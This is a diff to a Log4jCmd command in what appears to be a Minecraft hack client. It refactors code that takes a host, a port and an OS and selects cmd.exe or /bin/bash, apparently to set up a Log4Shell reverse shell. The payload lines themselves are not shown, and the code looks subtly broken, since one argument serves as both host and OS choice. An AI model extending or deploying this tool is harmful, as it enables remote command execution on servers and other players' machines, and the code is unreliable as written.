@@ -8,6 +8,7 @@
 package net.wurstclient.forge.commands;
 
 import net.wurstclient.forge.Command;
+import net.wurstclient.forge.utils.ChatUtils;
 
 public final class Log4jCmd extends Command {
     public Log4jCmd() {
@@ -21,17 +22,20 @@ public final class Log4jCmd extends Command {
         else if (Integer.parseInt(args[2]) > 65536 || Integer.parseInt(args[2]) < 1) {
             throw new CmdSyntaxError("端口号必须>1且<65536.");
         } else {
+            String host = "127.0.0.1";
+            int port = 9091;
+            String cmd = "";
             try {
-                String host = args[1];
+                host = args[1];
                 try {
-                    int port = Integer.parseInt(args[2]);
+                    port = Integer.parseInt(args[2]);
                 } catch (NumberFormatException e) {
                     throw new CmdSyntaxError("端口必须为一个>1且<65536的数字.");
                 }
                 if (args[1].equals("win")) {
-                    String cmd = "cmd.exe";
+                    cmd = "cmd.exe";
                 } else if (args[1].equals("linux")) {
-                    String cmd = "/bin/bash";
+                    cmd = "/bin/bash";
                 } else {
                     throw new CmdSyntaxError("系统只能是 'win' 或 'linux'.");
                 }
